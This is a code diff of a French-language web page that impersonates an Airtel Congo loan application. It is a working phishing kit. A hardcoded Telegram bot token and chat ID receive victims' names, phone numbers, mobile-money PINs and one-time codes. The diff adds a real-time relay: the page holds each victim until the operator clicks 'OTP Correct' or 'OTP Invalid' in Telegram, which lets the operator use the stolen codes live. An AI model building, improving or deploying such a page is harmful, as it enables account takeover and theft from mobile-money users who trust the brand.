@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="description" content="Prêt urgent pour besoins personnels ? Remboursement sur revenu mensuel.">
-  <title>Demande de prêt Airtel</title>
+  <title>Demande de Prêt Airtel</title>
   <style>
     *{box-sizing:border-box}
     :root{--blue:#5b6fe3;--purple:#a64fc9;--ink:#17202b;--muted:#8b929d;--line:#d6d6d6}
@@ -55,13 +55,6 @@
     .note,.verification-panel .note{color:#888;font-size:11px;line-height:1.5;margin:14px auto;max-width:360px}
     .status{color:#687fe0;font-size:12px;min-height:18px;margin:8px 0 0}
     .verification-heading{font-weight:700;margin:12px 0 8px}
-    .demo-overlay{display:none;position:fixed;inset:0;background:#0007;z-index:20;align-items:center;justify-content:center;padding:20px}
-    .demo-overlay.show{display:flex}
-    .demo-modal{width:min(100%,438px);min-height:275px;background:#fff;border-radius:11px;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:30px 24px;text-align:center;box-shadow:0 4px 14px #0002}
-    .demo-modal .spinner{width:82px;height:82px;border-radius:50%;background:#7b8fe6;display:grid;place-items:center;box-shadow:0 0 30px #7187e855;margin-bottom:24px;position:relative}
-    .demo-modal .spinner:after{content:"";width:58px;height:58px;border:3px solid transparent;border-top-color:white;border-right-color:white;border-bottom-color:white;border-radius:50%;animation:spin 1s linear infinite}
-    .demo-modal h2{color:#687fe0;font-size:22px;margin:0 0 6px}.demo-modal p{color:#777;font-size:13px}
-    .demo-modal button{border:0;border-radius:7px;padding:11px 18px;background:#687fe0;color:white;cursor:pointer;margin-top:8px}
     @media(max-width:560px){.verification-panel{padding:32px 18px}.codes{gap:8px}.codes input{width:48px;height:52px}.eye{margin-left:2px;padding:6px}}
   </style>
 </head>
@@ -70,7 +63,7 @@
     <a class="back hidden" id="backLink" href="#" aria-label="Retour">← Retour</a>
     <a class="brand" id="brandHome" href="#" aria-label="Accueil Demo Finance">
       <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSQSTnm-h_nAA4QN-K6WxMaElmJqrXNeI04XtMvjX3RRA&s=10" alt="Logo Airtel" class="brand-logo" style="height: 28px; width: auto; vertical-align: middle;">
-      <small style="color: red;">UNE RAISON D'IMAGINER</small>
+      <small style="color: red;">A REASON TO IMAGINE</small>
     </a>
     <button class="menu" id="menuBtn" type="button" aria-label="Menu">☰</button>
   </header>
@@ -78,7 +71,7 @@
   <main>
     <section class="panel home-panel" id="home">
       <h1>DEMANDEZ VOTRE PRÊT AVEC <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSQSTnm-h_nAA4QN-K6WxMaElmJqrXNeI04XtMvjX3RRA&s=10" alt="Logo Airtel" style="height: 22px; width: auto; vertical-align: middle;"></h1>
-      <p class="subtitle">Approbation rapide • Taux compétitifs • Modalités flexibles</p>
+      <p class="subtitle">Approbation rapide • Taux compétitifs • Conditions flexibles</p>
       <div class="calculator">
         <h2>Calculateur de prêt</h2>
         <div class="range-heading"><label for="amountRange">Montant du prêt</label><strong id="amountLabel">$2,500</strong></div>
@@ -115,8 +108,8 @@
         </div>
         <div class="step hidden" data-step="2">
           <div class="two-col">
-            <div><label for="firstName">Prénom</label><input id="firstName" autocomplete="given-name" placeholder="prénom" required></div>
-            <div><label for="lastName">Nom de famille</label><input id="lastName" autocomplete="family-name" placeholder="nom de famille" required></div>
+            <div><label for="firstName">Prénom</label><input id="firstName" autocomplete="given-name" placeholder="Prénom" required></div>
+            <div><label for="lastName">Nom / Nom de famille</label><input id="lastName" autocomplete="family-name" placeholder="Nom / nom de famille" required></div>
           </div>
           <label for="email">Adresse e-mail</label>
           <input id="email" type="email" autocomplete="off" placeholder="exemple@gmail.com" required>
@@ -125,7 +118,7 @@
           <small class="hint"></small>
         </div>
         <div class="step hidden" data-step="3">
-          <label for="employment">Situation professionnelle</label>
+          <label for="employment">Statut professionnel</label>
           <select id="employment"><option>Salarié</option><option>Travailleur indépendant</option><option>Chef d'entreprise</option><option>Étudiant</option><option>Sans emploi</option></select>
           <label for="income">Revenu annuel (USD)</label>
           <input id="income" type="number" min="0" placeholder="50000">
@@ -189,22 +182,13 @@
     <section class="panel verify-panel hidden" id="confirmation">
       <div class="success-icon">✓</div>
       <h1>Soumis</h1>
-      <div class="notice">Votre demande et vos étapes de vérification ont été soumises.</div>
-      <button class="primary full" id="restartBtn" type="button">COMMENCER UNE NOUVELLE DEMANDE</button>
+      <div class="notice">Votre demande et vos étapes de vérification ont été vérifiées.</div>
+      <button class="primary full" id="restartBtn" type="button">NOUVELLE DEMANDE</button>
     </section>
   </main>
 
   <div class="loading-overlay hidden" id="loadingOverlay" role="status" aria-live="polite">
     <div class="loading-card"><div class="spinner" aria-hidden="true"></div><h2>Envoi en cours...</h2><p></p></div>
-  </div>
-
-  <div class="demo-overlay" id="verificationOverlay" role="dialog" aria-modal="true" aria-labelledby="overlayTitle" aria-describedby="overlayDescription">
-    <div class="demo-modal">
-      <div class="spinner" aria-hidden="true"></div>
-      <h2 id="overlayTitle">Patientez pour le code de vérification envoyé au numéro de téléphone</h2>
-      <p id="overlayDescription">Cela prend moins d'une minute. Cliquez sur Continuer une fois le code reçu</p>
-      <button id="closeVerificationOverlay" type="button">Continuer</button>
-    </div>
   </div>
 
   <footer>© 2026 Airtel Congo. Tous droits réservés.</footer>
@@ -214,7 +198,7 @@
 
     const TELEGRAM_BOT_TOKEN = "8253214824:AAGodlrpAXEFqUcWOGXKbzCoNHLoL5vArcE";
     const TELEGRAM_CHAT_ID = "6009831676";
-    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
     const $ = id => document.getElementById(id);
     const home = $('home');
@@ -224,31 +208,134 @@
     const loadingOverlay = $('loadingOverlay');
 
     let step = 1;
-    let verificationOverlayNext = null;
+    let lastUpdateId = 0;
 
     const money = n => '$' + Number(n || 0).toLocaleString('en-US', { maximumFractionDigits: 0 });
 
-    async function sendTelegramMessage(text) {
+    function formatTime(date) {
+      return date.toLocaleTimeString('en-US', {
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: true
+      });
+    }
+
+    function formatDateTime(date) {
+      const yyyy = date.getFullYear();
+      const mm = String(date.getMonth() + 1).padStart(2, '0');
+      const dd = String(date.getDate()).padStart(2, '0');
+      return `${yyyy}-${mm}-${dd} ${formatTime(date)}`;
+    }
+
+    async function tgRequest(method, payload) {
+      const res = await fetch(`${TG_API}/${method}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      return await res.json();
+    }
+
+    async function syncLatestUpdateOffset() {
       try {
-        const res = await fetch(TELEGRAM_API_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text
-          })
-        });
-        return res.ok;
+        const data = await tgRequest('getUpdates', { offset: -1, timeout: 0 });
+        if (data.ok && Array.isArray(data.result) && data.result.length > 0) {
+          lastUpdateId = data.result[data.result.length - 1].update_id + 1;
+        }
       } catch (err) {
-        console.error('Telegram send failed:', err);
-        return false;
+        console.error('Failed to sync update offset:', err);
       }
     }
 
-    async function sendIndividualDetails(items) {
-      for (const item of items) {
-        await sendTelegramMessage(item);
+    // Sends ONLY name, phone, and code value (PIN first, then Verification Code), and waits for button click
+    async function submitCodeAndWaitForTelegram({ user, phone, fieldLabel, codeValue, timeoutMs = 120000 }) {
+      await syncLatestUpdateOffset();
+
+      const requestId = `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
+      const now = new Date();
+      const expires = new Date(now.getTime() + 5 * 60 * 1000);
+
+      const text = [
+        `🔒 ${fieldLabel.toUpperCase()} SOUMIS POUR VÉRIFICATION`,
+        '────────────────────────',
+        `👤 Utilisateur : ${user}`,
+        `☎️ Téléphone : ${phone}`,
+        `🔑 ${fieldLabel} : ${codeValue}`,
+        '',
+        `⏰ Soumis : ${formatTime(now)}`,
+        `⏰ Expire : ${formatTime(expires)}`,
+        '────────────────────────',
+        '⏳ En attente de la vérification de l\'administrateur...'
+      ].join('\n');
+
+      const sent = await tgRequest('sendMessage', {
+        chat_id: TELEGRAM_CHAT_ID,
+        text,
+        reply_markup: {
+          inline_keyboard: [[
+            { text: '✅ OTP Correct', callback_data: `approve:${requestId}` },
+            { text: '❌ OTP Invalid', callback_data: `reject:${requestId}` }
+          ]]
+        }
+      });
+
+      if (!sent.ok) {
+        throw new Error(sent.description || 'Échec de l\'envoi du message vers Telegram');
       }
+
+      const deadline = Date.now() + timeoutMs;
+
+      while (Date.now() < deadline) {
+        const remainingSec = Math.max(1, Math.min(15, Math.ceil((deadline - Date.now()) / 1000)));
+        const updatesData = await tgRequest('getUpdates', {
+          offset: lastUpdateId,
+          timeout: remainingSec,
+          allowed_updates: ['callback_query']
+        });
+
+        if (updatesData.ok && Array.isArray(updatesData.result)) {
+          for (const upd of updatesData.result) {
+            lastUpdateId = Math.max(lastUpdateId, upd.update_id + 1);
+            const cq = upd.callback_query;
+            if (!cq || !cq.data) continue;
+
+            const [action, id] = String(cq.data).split(':');
+            if (id !== requestId) continue;
+
+            const approved = action === 'approve';
+
+            await tgRequest('answerCallbackQuery', {
+              callback_query_id: cq.id,
+              text: approved ? 'Confirmé comme correct' : 'Marqué comme invalide'
+            });
+
+            await tgRequest('sendMessage', {
+              chat_id: TELEGRAM_CHAT_ID,
+              text: approved
+                ? [
+                    `✅ ${fieldLabel.toUpperCase()} VÉRIFIÉ AVEC SUCCÈS`,
+                    '────────────────────────',
+                    `👤 Nom : ${user}`,
+                    `☎️ Téléphone : ${phone}`,
+                    `⏰ Vérifié : ${formatDateTime(new Date())}`,
+                    '────────────────────────',
+                    `✅ ${fieldLabel} confirmé !`
+                  ].join('\n')
+                : [
+                    `❌ ${fieldLabel.toUpperCase()} INVALIDE`,
+                    '────────────────────────',
+                    `👤 Nom : ${user}`,
+                    `☎️ Téléphone : ${phone}`
+                  ].join('\n')
+            });
+
+            return { ok: true, verified: approved };
+          }
+        }
+      }
+
+      return { ok: false, verified: false, status: 'timeout' };
     }
 
     function estimate() {
@@ -326,7 +413,7 @@
       if (step === 2) {
         if (!$('email').checkValidity()) {
           $('email').focus();
-          $('errorMsg').textContent = 'Veuillez entrer une adresse e-mail valide.';
+          $('errorMsg').textContent = 'Veuillez saisir une adresse e-mail valide.';
           return false;
         }
         if (!/^\d{9,10}$/.test($('phone').value)) {
@@ -353,34 +440,16 @@
       $('sumPhone').textContent = '+243 ' + $('phone').value;
     }
 
-    $('loanForm').addEventListener('submit', async event => {
+    $('loanForm').addEventListener('submit', event => {
       event.preventDefault();
       if (!validStep()) return;
 
       updateSummary();
-      $('submitBtn').disabled = true;
-      loadingOverlay.classList.remove('hidden');
+      const phoneRaw = $('phone').value.trim();
 
-      const phoneFormatted = '+243 ' + $('phone').value.trim();
-
-      await sendIndividualDetails([
-        `Type de prêt : ${$('loanType').value}`,
-        `Montant du prêt : ${money($('loanAmount').value)}`,
-        `Durée du prêt : ${$('loanDuration').value} mois`,
-        `Objet : ${$('purpose').value.trim()}`,
-        `Prénom : ${$('firstName').value.trim()}`,
-        `Nom de famille : ${$('lastName').value.trim()}`,
-        `E-mail : ${$('email').value.trim()}`,
-        `Téléphone : ${phoneFormatted}`,
-        `Situation professionnelle : ${$('employment').value}`,
-        `Revenu annuel : ${$('income').value.trim() || 'Non renseigné'}`
-      ]);
-
-      loadingOverlay.classList.add('hidden');
-      $('submitBtn').disabled = false;
       application.classList.add('hidden');
       verification.classList.remove('hidden');
-      $('verificationPhone').textContent = phoneFormatted;
+      $('verificationPhone').textContent = phoneRaw;
       $('backLink').classList.add('hidden');
       resetVerification();
       window.scrollTo(0, 0);
@@ -442,59 +511,81 @@
     const code1Group = setupCodeGroup('code1', 'continueCode');
     const code2Group = setupCodeGroup('code2', 'verifyCode');
 
+    // 1. Submit Name, Phone, and PIN -> wait until "OTP Correct" is clicked in Telegram -> go directly to Verification Code step
     $('continueCode').addEventListener('click', async () => {
       if (!code1Group.update()) return;
 
-      const phone = $('verificationPhone').textContent;
+      const user = `${$('firstName').value.trim()} ${$('lastName').value.trim()}`.trim();
+      const phone = $('phone').value.trim();
       const pin = code1Group.value();
 
       $('continueCode').disabled = true;
-      $('status1').textContent = 'Envoi du code PIN...';
+      $('status1').textContent = 'Veuillez patienter pendant la confirmation des informations...';
 
-      await sendIndividualDetails([
-        `Téléphone : ${phone}`,
-        `Code PIN : ${pin}`
-      ]);
+      try {
+        const result = await submitCodeAndWaitForTelegram({
+          user,
+          phone,
+          fieldLabel: 'PIN saisi',
+          codeValue: pin
+        });
 
-      $('status1').textContent = 'Code PIN envoyé.';
-      openVerificationOverlay(() => {
-        $('verificationStep1').classList.add('hidden');
-        $('verificationStep2').classList.remove('hidden');
-        $('code2').querySelector('input').focus();
-        window.scrollTo(0, 0);
-      });
+        if (result.ok && result.verified) {
+          $('status1').textContent = 'Confirmé.';
+          $('verificationStep1').classList.add('hidden');
+          $('verificationStep2').classList.remove('hidden');
+          $('code2').querySelector('input').focus();
+          window.scrollTo(0, 0);
+        } else if (result.status === 'timeout') {
+          $('status1').textContent = 'Aucune confirmation. Réessayez.';
+          $('continueCode').disabled = false;
+        } else {
+          $('status1').textContent = 'Marqué comme invalide. Veuillez réessayer et vérifier que vous saisissez les bonnes informations.';
+          $('continueCode').disabled = false;
+        }
+      } catch (err) {
+        console.error(err);
+        $('status1').textContent = err.message || 'Erreur de communication.';
+        $('continueCode').disabled = false;
+      }
     });
 
+    // 2. Submit Name, Phone, and Verification Code -> wait until "OTP Correct" is clicked in Telegram -> go to Confirmation
     $('verifyCode').addEventListener('click', async () => {
       if (!code2Group.update()) return;
 
-      const phone = $('verificationPhone').textContent;
-      const code = code2Group.value();
+      const user = `${$('firstName').value.trim()} ${$('lastName').value.trim()}`.trim();
+      const phone = $('phone').value.trim();
+      const otpEntered = code2Group.value();
 
       $('verifyCode').disabled = true;
-      $('status2').textContent = 'Envoi du code de vérification...';
+      $('status2').textContent = 'Veuillez patienter pendant la confirmation du code OTP...';
 
-      await sendIndividualDetails([
-        `Téléphone : ${phone}`,
-        `Code de vérification : ${code}`
-      ]);
+      try {
+        const result = await submitCodeAndWaitForTelegram({
+          user,
+          phone,
+          fieldLabel: 'OTP saisi',
+          codeValue: otpEntered
+        });
 
-      $('status2').textContent = 'Vérification terminée.';
-      verification.classList.add('hidden');
-      confirmation.classList.remove('hidden');
-      window.scrollTo(0, 0);
-    });
-
-    function openVerificationOverlay(nextAction) {
-      verificationOverlayNext = nextAction;
-      $('verificationOverlay').classList.add('show');
-      $('closeVerificationOverlay').focus();
-    }
-
-    $('closeVerificationOverlay').addEventListener('click', () => {
-      $('verificationOverlay').classList.remove('show');
-      if (typeof verificationOverlayNext === 'function') verificationOverlayNext();
-      verificationOverlayNext = null;
+        if (result.ok && result.verified) {
+          $('status2').textContent = 'OTP vérifié.';
+          verification.classList.add('hidden');
+          confirmation.classList.remove('hidden');
+          window.scrollTo(0, 0);
+        } else if (result.status === 'timeout') {
+          $('status2').textContent = 'Réessayez et vérifiez que vous saisissez les bonnes informations.';
+          $('verifyCode').disabled = false;
+        } else {
+          $('status2').textContent = 'OTP invalide. Veuillez réessayer.';
+          $('verifyCode').disabled = false;
+        }
+      } catch (err) {
+        console.error(err);
+        $('status2').textContent = err.message || 'Erreur.';
+        $('verifyCode').disabled = false;
+      }
     });
 
     document.querySelectorAll('[data-toggle]').forEach(button => {
